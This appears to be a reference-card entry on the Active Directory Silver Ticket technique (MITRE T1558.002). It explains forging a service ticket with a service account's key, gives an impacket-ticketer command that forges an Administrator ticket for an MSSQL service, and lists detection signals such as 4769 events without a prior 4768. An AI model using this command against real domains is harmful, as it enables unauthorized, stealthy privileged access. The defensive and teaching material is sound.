---
id: silver
type: technique
label: "Silver ticket"
phase: "persist"
tools: ["mimikatz"]
cve: null
detect: "A 4769 for that service with no prior 4768."
mitre: "T1558.002"
tag: null
---


# Silver ticket

### Affected object / attribute
**Service account key** (the target service’s password hash/AES key).

### Concept (deep)
Forge a **TGS** for a specific service with that service account’s key. The KDC is not contacted → **stealthier** than Golden, but scoped to the service (`MSSQLSvc`, `CIFS`, `HTTP`).

### Commands
```bash
impacket-ticketer -nthash <svc_hash> -domain-sid S-1-5-21-X \
  -domain corp.local -spn MSSQLSvc/sql.corp.local:1433 Administrator
```

### Detection
**4769** where the PAC group SIDs exceed AD truth; service account password rotation; AES-only service accounts.

---
